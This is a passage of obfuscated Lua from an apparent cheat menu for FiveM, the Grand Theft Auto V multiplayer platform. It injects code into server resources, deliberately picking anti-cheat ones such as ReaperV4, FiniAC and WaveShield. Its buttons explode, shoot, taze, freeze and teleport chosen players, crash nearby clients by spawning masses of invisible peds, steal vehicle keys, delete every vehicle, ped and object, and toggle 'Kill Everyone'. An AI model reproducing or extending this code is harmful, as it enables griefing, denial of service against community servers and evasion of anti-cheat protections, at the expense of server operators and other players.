                        local pEd = ZxCvBnMaSdFgTrEq(RvTyUiOpAsDfGhJ)

                        if not pEd or not DoesEntityExist(pEd) then return end

                        local tArGeT = TyUiOpAsDfGhJkLz(pEd)
                        local oRiGiN = vector3(tArGeT.x, tArGeT.y, tArGeT.z + 2.0)

                        QwErTyUiOpAsDfGh(
                            oRiGiN.x, oRiGiN.y, oRiGiN.z,
                            tArGeT.x, tArGeT.y, tArGeT.z,
                            500.0,
                            true,
                            GetHashKey("WEAPON_ASSAULTRIFLE"),
                            PlayerPedId(),
                            true,
                            false,
                            -1.0
                        )
                    end)
                end

                UiLpKjHgFdSaTrEq()
            ]]):format(v184));end end);MachoMenuButton(v40[1 + 0 ],"Taze Player",function() local v185=0;local v186;while true do if (v185==(1690 -(1121 + 569))) then v186=MachoMenuGetSelectedPlayer();if (v186 and (v186>0)) then MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
                local function UiLpKjHgFdSaTrEq()
                    local RvTyUiOpAsDfGhJ = %d

                    local dFrTgYhUjIkLoPl = CreateThread
                    dFrTgYhUjIkLoPl(function()
                        Wait(0)

                        local ZxCvBnMaSdFgTrEq = GetPlayerPed
                        local TyUiOpAsDfGhJkLz = GetEntityCoords
                        local QwErTyUiOpAsDfGh = ShootSingleBulletBetweenCoords
                        local pEd = ZxCvBnMaSdFgTrEq(RvTyUiOpAsDfGhJ)

                        if not pEd or not DoesEntityExist(pEd) then return end

                        local tArGeT = TyUiOpAsDfGhJkLz(pEd)
                        local oRiGiN = vector3(tArGeT.x, tArGeT.y, tArGeT.z + 2.0)

                        QwErTyUiOpAsDfGh(
                            oRiGiN.x, oRiGiN.y, oRiGiN.z,
                            tArGeT.x, tArGeT.y, tArGeT.z,
                            0,
                            true,
                            GetHashKey("WEAPON_STUNGUN"),
                            PlayerPedId(),
                            true,
                            false,
                            -1.0
                        )
                    end)
                end

                UiLpKjHgFdSaTrEq()
            ]]):format(v186));end break;end end end);MachoMenuButton(v40[215 -(22 + 192) ],"Explode Player",function() local v187=MachoMenuGetSelectedPlayer();if (v187 and (v187>(683 -(483 + 200)))) then MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,([[
                local function TzYuIoPlMnBvCxZa()
                    local iOpAsDfGhJkLzXcV = %d

                    local ZqWeRtYuIoPlMnB = CreateThread
                    ZqWeRtYuIoPlMnB(function()
                        Wait(0)

                        local jBtWxFhPoZuR = GetPlayerPed
                        local mWjErTbYcLoU = GetEntityCoords
                        local aSdFgTrEqWzXcVb = AddExplosion

                        local pEd = jBtWxFhPoZuR(iOpAsDfGhJkLzXcV)
                        if not pEd or not DoesEntityExist(pEd) then return end

                        local coords = mWjErTbYcLoU(pEd)
                        aSdFgTrEqWzXcVb(coords.x, coords.y, coords.z, 6, 10.0, true, false, 1.0)
                    end)
                end

                TzYuIoPlMnBvCxZa()
            ]]):format(v187));end end);MachoMenuButton(v40[1464 -(1404 + 59) ],"Give All Nearby Objects",function() local v188=0 -0 ;local v189;while true do if (v188==(0 -0)) then v189=MachoMenuGetSelectedPlayer();if (v189 and (v189>(765 -(468 + 297)))) then MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,([[
                local function TzYuIoPlMnBvCxZa()
                    local xWcErTvBnMzLp = %d

                    local aGhJkLpOiUyTr = _G.GetPlayerPed
                    local bUiOpLkJhGfDs = _G.DoesEntityExist
                    local cPzWsXcEdCvBnM = _G.GetEntityCoords
                    local dRtYuIoPlMnBgF = _G.SetEntityCoords
                    local eAsDfGhJkLqWe = _G.RequestControlOfEntity or RequestCtrlOverEntity
                    local fZxCvBnMqWeRt = _G.NetworkRequestControlOfEntity
                    local gXcVbNmZqWeRt = _G.SetEntityAsMissionEntity

                    local function iRequest(obj)
                        fZxCvBnMqWeRt(obj)
                        eAsDfGhJkLqWe(obj)
                        gXcVbNmZqWeRt(obj, true, true)
                    end

                    CreateThread(function()
                        Wait(0)

                        local targetPed = aGhJkLpOiUyTr(xWcErTvBnMzLp)
                        if not bUiOpLkJhGfDs(targetPed) then return end
                        local coords = cPzWsXcEdCvBnM(targetPed)

                        for obj in EnumerateObjects() do
                            if bUiOpLkJhGfDs(obj) then
                                iRequest(obj)
                                dRtYuIoPlMnBgF(obj, coords.x, coords.y, coords.z, false, false, false, false)
                            end
                        end
                    end)
                end

                TzYuIoPlMnBvCxZa()

            ]]):format(v189));end break;end end end);MachoMenuButton(v40[563 -(334 + 228) ],"Teleport To Player",function() local v190=MachoMenuGetSelectedPlayer();if (v190 and (v190>(0 -0))) then MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
                local function GhJkUiOpLzXcVbNm()
                    local kJfHuGtFrDeSwQa = %d
                    local oXyBkVsNzQuH = GetPlayerPed
                    local zXcVbNmQwErTyUi = GetEntityCoords
                    local xAsDfGhJkLpOiU = SetEntityCoords

                    local myPed = PlayerPedId()
                    local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                    local targetCoords = zXcVbNmQwErTyUi(targetPed)

                    xAsDfGhJkLpOiU(myPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                end

                GhJkUiOpLzXcVbNm()
            ]]):format(v190));end end);MachoMenuButton(v40[1],"Kick From Vehicle",function() local v191=0 -0 ;local v192;while true do if (v191==(0 -0)) then v192=MachoMenuGetSelectedPlayer();if (v192 and (v192>(0 + 0))) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function GhJkUiOpLzXcVbNm()
                    local kJfHuGtFrDeSwQa = %d
                    local oXyBkVsNzQuH = _G.GetPlayerPed
                    local yZaSdFgHjKlQ = _G.GetVehiclePedIsIn
                    local wQeRtYuIoPlMn = _G.PlayerPedId
                    local cVbNmQwErTyUiOp = _G.SetVehicleExclusiveDriver_2
                    local ghjawrusdgddsaf = _G.SetPedIntoVehicle

                    local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                    local veh = yZaSdFgHjKlQ(targetPed, 0)

                    local function nMzXcVbNmQwErTy(func, ...)
                        local _print = print
                        local function errorHandler(ex)
                            -- _print("SCRIPT ERROR: " .. ex)
                        end

                        local argsStr = ""
                        for _, v in ipairs({...}) do
                            if type(v) == "string" then
                                argsStr = argsStr .. "\"" .. v .. "\", "
                            elseif type(v) == "number" or type(v) == "boolean" then
                                argsStr = argsStr .. tostring(v) .. ", "
                            else
                                argsStr = argsStr .. tostring(v) .. ", "
                            end
                        end
                        argsStr = argsStr:sub(1, -3)

                        local script = string.format("return func(%%s)", argsStr)
                        local fn, err = load(script, "@pipboy.lua", "t", { func = func })
                        if not fn then
                            -- _print("Error loading script: " .. err)
                            return nil
                        end

                        local success, result = xpcall(function() return fn() end, errorHandler)
                        if not success then
                            -- _print("Error executing script: " .. result)
                            return nil
                        else
                            return result
                        end
                    end

                    if veh ~= 0 then
                        Wait(100)
                        nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, wQeRtYuIoPlMn(), 1)
                        ghjawrusdgddsaf(wQeRtYuIoPlMn(), veh, -1)
                        
                        Wait(100)
                        nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, 0, 0)
                    end
                end

                GhJkUiOpLzXcVbNm()
            ]]):format(v192));end break;end end end);MachoMenuButton(v40[237 -(141 + 95) ],"Freeze Player",function() local v193=MachoMenuGetSelectedPlayer();if (v193 and (v193>0)) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function VtQzAfXyYu()
                    local RqTfBnLpZo = %d
                    local FgTrLpYwVs = GetPlayerPed
                    local EoKdCjXqMg = GetEntityCoords
                    local ZbLpVnXwQr = GetClosestVehicle
                    local WqErTyUiOp = PlayerPedId
                    local AsDfGhJkLz = SetPedIntoVehicle
                    local PoLiKjUhYg = ClearPedTasks
                    local QwErTyUiOp = NetworkRequestControlOfEntity
                    local CxZvBnMaSd = GetGameTimer
                    local VcMnBgTrEl = Wait
                    local TeAxSpDoMj = AttachEntityToEntityPhysically
                    local wfjaw4dtdu = CreateThread
                    local tgtPed = FgTrLpYwVs(RqTfBnLpZo)
                    local tgtCoords = EoKdCjXqMg(tgtPed)
                    local veh = cHvBzNtEkQ(tgtCoords, 150.0, 0, 70)

                    if not veh or veh == 0 then
                        print("No vehicle nearby | Aborting.")
                        return
                    end

                    QwErTyUiOp(veh)
                    Wait(100)
                    AsDfGhJkLz(WqErTyUiOp(), veh, -1)
                    VcMnBgTrEl(200)
                    PoLiKjUhYg(WqErTyUiOp())

                    wfjaw4dtdu(function()
                        local start = CxZvBnMaSd()
                        while CxZvBnMaSd() - start < 3000 do
                            TeAxSpDoMj(
                                veh,
                                tgtPed,
                                0.0, 0.0, 10.0,
                                10.0, 0.0, 0.0,
                                true, 0, 0,
                                false, false, 0
                            )
                            VcMnBgTrEl(0)
                        end
                    end)
                end

                VtQzAfXyYu()
            ]]):format(v193));end end);MachoMenuButton(v40[1 + 0 ],"Glitch Player",function() local v194=0;local v195;while true do if (v194==(0 -0)) then v195=MachoMenuGetSelectedPlayer();if (v195 and (v195>(0 -0))) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function TnXmLoPrVq()
                    local kPdZoWxNq = %d

                    local LsKjHgFdSa = GetPlayerPed
                    local ZxCvBnMaQw = GetEntityCoords
                    local QtRvBnPoLs = GetClosestVehicle
                    local VcBgTrElMn = PlayerPedId
                    local KdJfGhTyPl = SetPedIntoVehicle
                    local TrLkUyIoPl = ClearPedTasks
                    local MwZlQxNsTp = NetworkRequestControlOfEntity
                    local AsYtGhUiMn = GetGameTimer
                    local WqErTyUiOp = Wait
                    local TeAxSpDoMj = AttachEntityToEntityPhysically
                    local CrXeTqLpVi = CreateThread

                    local xGyPtMdLoB = LsKjHgFdSa(kPdZoWxNq)
                    local zUiRpXlAsV = ZxCvBnMaQw(xGyPtMdLoB)
                    local jCaBnErYqK = QtRvBnPoLs(zUiRpXlAsV, 150.0, 0, 70)

                    if not jCaBnErYqK or jCaBnErYqK == 0 then
                        print("No vehicle nearby | Aborting.")
                        return
                    end

                    MwZlQxNsTp(veh)
                    Wait(100)
                    KdJfGhTyPl(VcBgTrElMn(), jCaBnErYqK, -1)
                    WqErTyUiOp(200)
                    TrLkUyIoPl(VcBgTrElMn())

                    CrXeTqLpVi(function()
                        local tGhXpLsMkA = AsYtGhUiMn()
                        local bErXnPoVlC = 3000

                        while AsYtGhUiMn() - tGhXpLsMkA < bErXnPoVlC do
                            TeAxSpDoMj(
                                jCaBnErYqK,
                                xGyPtMdLoB,
                                0, 0, 0,
                                2000.0, 1460.928, 1000.0,
                                10.0, 88.0, 600.0,
                                true, true, true, false, 0
                            )
                            WqErTyUiOp(0)
                        end
                    end)
                end

                TnXmLoPrVq()
            ]]):format(v195));end break;end end end);MachoMenuButton(v40[1 + 0 ],"Limbo Player",function() local v196=MachoMenuGetSelectedPlayer();if (v196 and (v196>(0 -0))) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function VyTxQzWsCr()
                    local lDxNzVrMpY = %d

                    local FgTrLpYwVs = GetPlayerPed
                    local EoKdCjXqMg = GetEntityCoords
                    local ZbLpVnXwQr = GetClosestVehicle
                    local WqErTyUiOp = PlayerPedId
                    local AsDfGhJkLz = SetPedIntoVehicle
                    local PoLiKjUhYg = ClearPedTasks
                    local QwErTyUiOp = NetworkRequestControlOfEntity
                    local CxZvBnMaSd = GetGameTimer
                    local VcMnBgTrEl = Wait
                    local TeAxSpDoMj = AttachEntityToEntityPhysically
                    local CrXeTqLpVi = CreateThread

                    local vUpYrTnMwE = FgTrLpYwVs(lDxNzVrMpY)
                    local xAoPqMnBgR = EoKdCjXqMg(vUpYrTnMwE)
                    local cHvBzNtEkQ = ZbLpVnXwQr(xAoPqMnBgR, 150.0, 0, 70)

                    if not cHvBzNtEkQ or cHvBzNtEkQ == 0 then
                        print("No vehicle nearby | Aborting.")
                        return
                    end

                    QwErTyUiOp(veh)
                    Wait(100)
                    AsDfGhJkLz(WqErTyUiOp(), cHvBzNtEkQ, -1)
                    VcMnBgTrEl(200)
                    PoLiKjUhYg(WqErTyUiOp())

                    CrXeTqLpVi(function()
                        local kYqPmTnVzL = CxZvBnMaSd()
                        local yTbQrXlMwA = 3000
                        local hFrMxWnZuE, dEjKzTsYnL = 180.0, 8888.0

                        while CxZvBnMaSd() - kYqPmTnVzL < yTbQrXlMwA do
                            TeAxSpDoMj(
                                cHvBzNtEkQ,
                                vUpYrTnMwE,
                                0, 0, 0,
                                hFrMxWnZuE, dEjKzTsYnL, 1000.0,
                                true, true, true, true, 0
                            )
                            VcMnBgTrEl(0)
                        end
                    end)
                end

                VyTxQzWsCr()
            ]]):format(v196));end end);MachoMenuButton(v40[1 + 0 ],"Copy Appearance",function() local v197=MachoMenuGetSelectedPlayer();if (v197 and (v197>(0 + 0))) then MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
                local function AsDfGhJkLqWe()
                    local ZxCvBnMqWeRt = %d
                    local UiOpAsDfGhJk = GetPlayerPed
                    local QwErTyUiOpAs = PlayerPedId
                    local DfGhJkLqWeRt = DoesEntityExist
                    local ErTyUiOpAsDf = ClonePedToTarget

                    local TyUiOpAsDfGh = UiOpAsDfGhJk(ZxCvBnMqWeRt)
                    if DfGhJkLqWeRt(TyUiOpAsDfGh) then
                        local YpAsDfGhJkLq = QwErTyUiOpAs()
                        ErTyUiOpAsDf(TyUiOpAsDfGh, YpAsDfGhJkLq)
                    end
                end

                AsDfGhJkLqWe()
            ]]):format(v197));end end);MachoMenuButton(v40[1],"Steal Keys",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local ped = GetPlayerPed(-1)
     local veh = GetVehiclePedIsIn((ped), true)  
     local plate = GetVehicleNumberPlateText(veh)
     TriggerEvent('vehiclekeys:client:SetOwner',plate)
        ]]);end);MachoMenuButton(v40[2 -0 ],"Crash Nearby [Don't Spam]",function() MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("FiniAC") and "FiniAC") or (v48("WaveShield") and "WaveShield") or (v48("monitor") and "monitor") or "any" ,[[
            local function sfehwq34rw7td()
                local Nwq7sd2Lkq0pHkfa = CreateThread
                Nwq7sd2Lkq0pHkfa(function()
                    local hAx9qTeMnb = CreateThread
                    local Jf9uZxcTwa = _G.CreatePed           -- Creates a pedestrian (NPC)
                    local VmzKo3sRt7 = _G.PlayerPedId         -- Gets the player's ped ID
                    local LuZx8nqTys = _G.GetEntityCoords     -- Gets entity coordinates
                    local QksL02vPdt = _G.GetEntityHeading    -- Gets entity heading
                    local Tmn1rZxOq8 = _G.SetEntityCoordsNoOffset -- Sets entity coordinates
                    local PfQsXoEr6b = _G.GiveWeaponToPed    -- Gives a weapon to a ped
                    local WvNay7Zplm = _G.TaskParachute       -- Makes a ped use a parachute
                    local DjRq08bKxu = _G.FreezeEntityPosition -- Freezes entity position
                    local EkLnZmcTya = _G.GetHashKey         -- Gets a model hash key
                    local YdWxVoEna3 = _G.RequestModel       -- Requests a model to load
                    local GcvRtPszYp = _G.HasModelLoaded     -- Checks if a model is loaded
                    local MnVc8sQaLp = _G.SetEntityAsMissionEntity -- Marks entity as mission-related
                    local KrXpTuwq9c = _G.SetModelAsNoLongerNeeded -- Frees model from memory
                    local VdNzWqbEyf = _G.DoesEntityExist    -- Checks if an entity exists
                    local AxWtRuLskz = _G.DeleteEntity       -- Deletes an entity
                    local OplKvms9te = _G.Wait               -- Pauses execution for a specified time
                    local BnQvKdsLxa = _G.GetGroundZFor_3dCoord -- Gets ground Z-coordinate
                    local VmxrLa9Ewt = _G.ApplyForceToEntity -- Applies force to an entity
                    local fwafWAefAg = _G.SetEntityVisible   -- Sets entity visibility
                    local awrt325etd = _G.SetBlockingOfNonTemporaryEvents -- Blocks non-temporary events
                    local awfaw4eraq = _G.SetEntityAlpha     -- Sets entity transparency

                    hAx9qTeMnb(function()
                        -- Get the player's ped and its coordinates/heading
                        local QxoZnmWlae = VmzKo3sRt7() -- Player's ped
                        local EzPwqLtYas = LuZx8nqTys(QxoZnmWlae) -- Player's coordinates
                        local GzqLpAxdsv = QksL02vPdt(QxoZnmWlae) -- Player's heading
                        local ZtXmqLpEas = EzPwqLtYas.z + 1600.0 -- Set Z-coordinate 1600 units above

                        -- Teleport player to high altitude
                        Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, ZtXmqLpEas, false, false, false)

                        -- Apply downward force to simulate falling
                        VmxrLa9Ewt(QxoZnmWlae, 1, 0.0, 0.0, 5000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

                        -- Wait 250ms to allow the fall to start
                        OplKvms9te(250)

                        -- Freeze player in place
                        DjRq08bKxu(QxoZnmWlae, true)

                        -- Equip player with a parachute
                        PfQsXoEr6b(QxoZnmWlae, "gadget_parachute", 1, false, true)
                        WvNay7Zplm(QxoZnmWlae, false) -- Trigger parachute task

                        -- Freeze player again to prevent movement
                        DjRq08bKxu(QxoZnmWlae, true)

                        -- Load the "player_one" (Franklin) model
                        local UixZpvLoa9 = EkLnZmcTya("player_one")
                        YdWxVoEna3(UixZpvLoa9)
                        -- Wait until the model is loaded
                        while not GcvRtPszYp(UixZpvLoa9) do OplKvms9te(0) end

                        -- Create a table to store created peds
                        local TzsPlcxQam = {}
                        -- Spawn 130 invisible peds at the player's location
                        for K9wo = 1, 130 do
                            local IuxErv7Pqa = Jf9uZxcTwa(28, UixZpvLoa9, EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z, GzqLpAxdsv, true, true)
                            if IuxErv7Pqa and VdNzWqbEyf(IuxErv7Pqa) then
                                MnVc8sQaLp(IuxErv7Pqa, true, true) -- Mark ped as mission entity
                                awrt325etd(IuxErv7Pqa, true) -- Block non-temporary events
                                awfaw4eraq(IuxErv7Pqa, 0, true) -- Make ped invisible
                                table.insert(TzsPlcxQam, IuxErv7Pqa) -- Store ped in table
                            end
                            OplKvms9te(1) -- Small delay to prevent freezing
                        end

                        -- Release the model from memory
                        KrXpTuwq9c(UixZpvLoa9)

                        -- Wait 300ms before cleaning up
                        OplKvms9te(300)

                        -- Delete all created peds (repeated calls may be for reliability)
                        for _, bTzyPq7Xsl in ipairs(TzsPlcxQam) do
                            if VdNzWqbEyf(bTzyPq7Xsl) then
                                AxWtRuLskz(bTzyPq7Xsl) -- Repeated deletion attempts
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                            end
                        end

                        -- Unfreeze the player
                        DjRq08bKxu(QxoZnmWlae, false)

                        -- Find the ground Z-coordinate at the player's location
                        local ZkxyPqtLs0, Zfound = BnQvKdsLxa(EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z + 100.0, 0, false)
                        if not ZkxyPqtLs0 then
                            Zfound = EzPwqLtYas.z -- Fallback to current Z if ground not found
                        end

                        -- Wait 1 second before teleporting
                        OplKvms9te(1000)

                        -- Teleport player to just above ground level
                        Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, Zfound + 1.0, false, false, false)
                        DjRq08bKxu(QxoZnmWlae, true) -- Freeze player briefly
                        DjRq08bKxu(QxoZnmWlae, false) -- Unfreeze player
                    end)
                end)
            end

            -- Execute the main function
            sfehwq34rw7td()
        ]]);end);MachoMenuButton(v40[2 + 0 ],"Cone Everyone",function() local v198=163 -(92 + 71) ;local v199;local v200;local v201;while true do if (v198==(0 + 0)) then v199=GetHashKey("prop_roadcone02a");RequestModel(v199);v198=1 -0 ;end if (v198==(769 -(574 + 191))) then for v355,v356 in ipairs(v201) do if  not IsPedAPlayer(v356) then v200(v356);end end break;end if (v198==(2 + 0)) then function v200(v357) local v358=0;local v359;local v360;local v361;while true do if (v358==(4 -2)) then SetEntityCollision(v360,false,false);SetEntityInvincible(v360,true);v358=3;end if (v358==0) then if ( not DoesEntityExist(v357) or IsEntityDead(v357)) then return;end v359=GetEntityCoords(v357);v358=1 + 0 ;end if (v358==(853 -(254 + 595))) then AttachEntityToEntity(v360,v357,v361,126 -(55 + 71) ,0 -0 ,1790.25 -(573 + 1217) ,0 -0 ,0,0 + 0 ,false,false,true,false,2 -0 ,true);break;end if (v358==(940 -(714 + 225))) then v360=CreateObject(v199,v359.x,v359.y,v359.z,true,true,false);SetEntityAsMissionEntity(v360,true,true);v358=5 -3 ;end if (v358==(3 -0)) then SetEntityCanBeDamaged(v360,false);v361=GetPedBoneIndex(v357,3366 + 27720 );v358=5 -1 ;end end end v200(PlayerPedId());v198=809 -(118 + 688) ;end if (v198==(51 -(25 + 23))) then for v362,v363 in ipairs(GetActivePlayers()) do v200(GetPlayerPed(v363));end v201=(GetGamePool and GetGamePool("CPed")) or {} ;v198=1 + 3 ;end if ((1887 -(927 + 959))==v198) then while  not HasModelLoaded(v199) do Wait(0);end v200=nil;v198=6 -4 ;end end end);MachoMenuButton(v40[734 -(16 + 716) ],"Explode All Players",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function fGhJkLpOiUzXcVb()
                local aSdFgHjKlQwErTy = GetActivePlayers
                local pOiUyTrEeRwQtYy = DoesEntityExist
                local mNbVcCxZzLlKkJj = GetEntityCoords
                local hGjFkDlSaPwOeIr = AddOwnedExplosion
                local tYuIoPaSdFgHjKl = PlayerPedId

                local eRtYuIoPlMnBvCx = aSdFgHjKlQwErTy()
                for _, wQeRtYuIoPlMnBv in ipairs(eRtYuIoPlMnBvCx) do
                    local yUiOpAsDfGhJkLz = GetPlayerPed(wQeRtYuIoPlMnBv)
                    if pOiUyTrEeRwQtYy(yUiOpAsDfGhJkLz) and yUiOpAsDfGhJkLz ~= tYuIoPaSdFgHjKl() then
                        local nMzXcVbNmQwErTy = mNbVcCxZzLlKkJj(yUiOpAsDfGhJkLz)
                        hGjFkDlSaPwOeIr(
                            tYuIoPaSdFgHjKl(),
                            nMzXcVbNmQwErTy.x,
                            nMzXcVbNmQwErTy.y,
                            nMzXcVbNmQwErTy.z,
                            6,     -- Explosion type
                            1.0,   -- Damage scale
                            true,  -- Audible
                            false, -- Invisible
                            0.0    -- Camera shake
                        )
                    end
                end
            end

            fGhJkLpOiUzXcVb()
        ]]);end);MachoMenuButton(v40[3 -1 ],"Explode All Vehicles",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function uYhGtFrEdWsQaZx()
                local rTyUiOpAsDfGhJk = GetGamePool
                local xAsDfGhJkLpOiUz = DoesEntityExist
                local cVbNmQwErTyUiOp = GetEntityCoords
                local vBnMkLoPiUyTrEw = AddOwnedExplosion
                local nMzXcVbNmQwErTy = PlayerPedId

                local _vehicles = rTyUiOpAsDfGhJk("CVehicle")
                local me = nMzXcVbNmQwErTy()
                for _, veh in ipairs(_vehicles) do
                    if xAsDfGhJkLpOiUz(veh) then
                        local pos = cVbNmQwErTyUiOp(veh)
                        vBnMkLoPiUyTrEw(me, pos.x, pos.y, pos.z, 6, 2.0, true, false, 0.0)
                    end
                end
            end
            uYhGtFrEdWsQaZx()
        ]]);end);MachoMenuButton(v40[99 -(11 + 86) ],"Delete All Vehicles",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function zXcVbNmQwErTyUi()
                local aSdFgHjKlQwErTy = GetGamePool
                local pOiUyTrEeRwQtYy = DoesEntityExist
                local mNbVcCxZzLlKkJj = NetworkRequestControlOfEntity
                local hGjFkDlSaPwOeIr = NetworkHasControlOfEntity
                local tYuIoPaSdFgHjKl = DeleteEntity
                local yUiOpAsDfGhJkLz = PlayerPedId
                local uIoPaSdFgHjKlQw = GetVehiclePedIsIn
                local gJkLoPiUyTrEqWe = GetGameTimer
                local fDeSwQaZxCvBnMm = Wait

                local me = yUiOpAsDfGhJkLz()
                local myVeh = uIoPaSdFgHjKlQw(me, false)

                local vehicles = aSdFgHjKlQwErTy("CVehicle")
                for _, veh in ipairs(vehicles) do
                    if pOiUyTrEeRwQtYy(veh) and veh ~= myVeh then
                        mNbVcCxZzLlKkJj(veh)
                        local timeout = gJkLoPiUyTrEqWe() + 500
                        while not hGjFkDlSaPwOeIr(veh) and gJkLoPiUyTrEqWe() < timeout do
                            fDeSwQaZxCvBnMm(0)
                        end
                        if hGjFkDlSaPwOeIr(veh) then
                            tYuIoPaSdFgHjKl(veh)
                        end
                    end
                end
            end
            zXcVbNmQwErTyUi()
        ]]);end);MachoMenuButton(v40[4 -2 ],"Delete All Peds",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qWeRtYuIoPlMnBv()
                local zXcVbNmQwErTyUi = GetGamePool
                local aSdFgHjKlQwErTy = DoesEntityExist
                local pOiUyTrEeRwQtYy = DeleteEntity
                local mNbVcCxZzLlKkJj = PlayerId
                local hGjFkDlSaPwOeIr = GetPlayerPed
                local tYuIoPaSdFgHjKl = NetworkRequestControlOfEntity
                local yUiOpAsDfGhJkLz = NetworkHasControlOfEntity
                local uIoPaSdFgHjKlQw = GetGameTimer
                local gJkLoPiUyTrEqWe = Wait
                local vBnMkLoPiUyTrEw = IsPedAPlayer

                local me = hGjFkDlSaPwOeIr(mNbVcCxZzLlKkJj())
                local peds = zXcVbNmQwErTyUi("CPed")

                for _, ped in ipairs(peds) do
                    if aSdFgHjKlQwErTy(ped) and ped ~= me and not vBnMkLoPiUyTrEw(ped) then
                        tYuIoPaSdFgHjKl(ped)
                        local timeout = uIoPaSdFgHjKlQw() + 500
                        while not yUiOpAsDfGhJkLz(ped) and uIoPaSdFgHjKlQw() < timeout do
                            gJkLoPiUyTrEqWe(0)
                        end
                        if yUiOpAsDfGhJkLz(ped) then
                            pOiUyTrEeRwQtYy(ped)
                        end
                    end
                end
            end
            qWeRtYuIoPlMnBv()
        ]]);end);MachoMenuButton(v40[287 -(175 + 110) ],"Delete All Objects",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function mNqAzXwSeRdTfGy()
                local rTyUiOpAsDfGhJk = GetGamePool
                local xAsDfGhJkLpOiUz = DoesEntityExist
                local cVbNmQwErTyUiOp = DeleteEntity
                local vBnMkLoPiUyTrEw = NetworkRequestControlOfEntity
                local nMzXcVbNmQwErTy = NetworkHasControlOfEntity
                local yUiOpAsDfGhJkLz = GetGameTimer
                local uIoPaSdFgHjKlQw = Wait

                local objects = rTyUiOpAsDfGhJk("CObject")
                for _, obj in ipairs(objects) do
                    if xAsDfGhJkLpOiUz(obj) then
                        vBnMkLoPiUyTrEw(obj)
                        local timeout = yUiOpAsDfGhJkLz() + 500
                        while not nMzXcVbNmQwErTy(obj) and yUiOpAsDfGhJkLz() < timeout do
                            uIoPaSdFgHjKlQw(0)
                        end
                        if nMzXcVbNmQwErTy(obj) then
                            cVbNmQwErTyUiOp(obj)
                        end
                    end
                end
            end
            mNqAzXwSeRdTfGy()
        ]]);end);MachoMenuButton(v40[4 -2 ],"ShowIDs [New Feature]",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local displayIDs = false -- toggles both self + nearby IDs

    function DrawText3D(x, y, z, text)
        local onScreen, _x, _y = World3dToScreen2d(x, y, z)
        if onScreen then
            SetTextFont(0)
            SetTextProportional(1)
            SetTextScale(0.5, 0.5)
            SetTextColour(255, 255, 255, 255)
            SetTextEntry("STRING")
            AddTextComponentString(text)
            DrawText(_x, _y)
        end
    end

    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)

            -- Toggle both IDs with E
            if IsControlJustPressed(0, 38) then
                displayIDs = not displayIDs
            end

            if displayIDs then
                -- Draw own ID
                local playerId = GetPlayerServerId(PlayerId())
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.3, 0.3)
                SetTextColour(255, 255, 255, 255)
                SetTextEntry("STRING")
                AddTextComponentString("Your Player ID: " .. playerId)
                DrawText(0.5, 0.1)

                -- Draw nearby players' IDs
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                local players = GetActivePlayers()

                for _, player in ipairs(players) do
                    local targetPed = GetPlayerPed(player)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local dist = #(playerCoords - targetCoords)

                        if dist < 40.0 then
                            local targetId = GetPlayerServerId(player)
                            DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "ID: " .. targetId)
                        end
                    end
                end
            end
        end
    end)
        ]]);end);MachoMenuCheckbox(v40[9 -7 ],"Kill Everyone",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if aSwDeFgHiJkLoPx == nil then aSwDeFgHiJkLoPx = false end
            aSwDeFgHiJkLoPx = true

            local function pLoMkIjUhbGyTf()
                local mAxPlErOy = PlayerPedId()
                local rVtNiUcEx = GetHashKey("WEAPON_ASSAULTRIFLE")
                local gBvTnCuXe = 100
                local aSdFgHjKl = 1000.0
                local lKjHgFdSa = 300.0

